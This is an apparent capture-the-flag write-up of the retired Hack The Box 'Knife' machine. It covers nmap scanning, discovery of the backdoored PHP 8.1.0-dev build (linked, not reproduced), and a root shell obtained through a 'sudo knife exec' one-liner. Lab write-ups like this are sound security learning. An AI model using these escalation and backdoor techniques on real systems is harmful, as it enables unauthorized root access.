# Knife
* 10.10.10.242
* "Easy" Linux OS
* Recently Retired
* Start Date: August 29, 2021
* Revisited Dates: N/A
* End Date: August 29, 2021
* Techniques: HTTP Headers, Nmap, Backdoors, sudo
* [Lessons Learned](#lessons-learned)

## Raw Attack

In this section, I take notes real-time as I progress.  This approach is a bit slower going on some boxes, but on this one it was quite straight forward.

### Nmap
```
# Nmap 7.91 scan initiated Sun Aug 29 16:36:29 2021 as: nmap -v -A -T4 -oA nmap/initial 10.10.10.242
Warning: 10.10.10.242 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.10.242
Host is up (0.14s latency).
Not shown: 991 closed ports
PORT      STATE    SERVICE        VERSION
22/tcp    open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp    open     http           Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title:  Emergent Medical Idea
1059/tcp  filtered nimreg
1070/tcp  filtered gmrupdateserv
1107/tcp  filtered isoipsigport-2
1111/tcp  filtered lmsocialserver
2105/tcp  filtered eklogin
9968/tcp  filtered unknown
27000/tcp filtered flexlm0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 29 16:37:02 2021 -- 1 IP address (1 host up) scanned in 32.88 seconds
```

HTTP server running, with SSH and several filtered ports.  So I'll fire up `dirb` and `burpsuite` and walk through the site a little bit.  Also, I'll check `searchsploit` against those versions of openssh and apache for any known issues.  The filtered ports might be useful if I can telnet to them or perhaps once I'm inside the machine.  I may try some basic SSH bruteforce but that's very slow and likely not a valid path.

### Dirb and Burpsuite

After looking with Burpsuite proxy and with Dirb (and dirbuster for good measure), all I found is:

* index.php
* icons folder

Nothing horribly interesting going on web-side.  Soemthing else must be happening on this box.

### Nmap UDP
```
PORT      STATE         SERVICE
2000/udp  open|filtered cisco-sccp
44923/udp open|filtered unknown
57409/udp open|filtered unknown
```

So these UDP ports tell me something interesting is going on here... let's revisit some of those filtered ports from before...

```
1059/tcp  filtered nimreg
1070/tcp  filtered gmrupdateserv
1107/tcp  filtered isoipsigport-2
1111/tcp  filtered lmsocialserver
2105/tcp  filtered eklogin
9968/tcp  filtered unknown
27000/tcp filtered flexlm0
```

On subsequent scans, none of these turn up :(

### "Backdoor"

The tags on this box say "backdoor", "web", and "php" so let's look closer at the website..

We know that boring homepage is served by PHP... what version?

Oh...

`PHP 8.1.0-dev` -- hmm... `-dev`???

Sure enough...

PHP 8.1.0-dev was an early release that shipped with a backdoor :facepalm:
https://www.exploit-db.com/exploits/49933

and now we have the user flag!  Also, we have the user's private ssh key!

### SSH

To make the private key work, I originally thought I'd have to crack it so I loaded up `ssh2john.py` and started JTR which pleasntly didn't inform me this key was not password protected.

What I actually had to do was add the user's public key to their authorized_keys file and then, locally, set 400 perms and specify it with the -i flag and pop, right in I go.

### Priv Esc.

First inside the box, I enumerate through the user's home folder a bit.  I find something interesting about nano in .local/share/nano but it doesn't lead anywhere.  There's also no bash history, so moving on...

`sudo -l` tells me I can run 'knife' without a password !?!? Oh, okay, well... 

https://gtfobins.github.io/gtfobins/knife/#shell  tells me I can also get a shell using `knife` which is actually capable of running ruby code and is a command that's part of `chef` and this explains the box's name!



```
james@knife:~$ sudo knife exec -E 'exec "/bin/sh"'
# whoami
root
```

And now we have root flag.

## Lessons Learned

For this box, I learned once again that you should always check the versions of every bit of software you run across.  In this case, I checked the versions of apache and openssh since nmap found them, but it wasn't until I checked the version of PHP in the Response header that everything came together.

Also, I was reminded that `sudo -l` can sometimes reveal commands you can run as root without a password and is very often the key to priv esc on these easier boxes

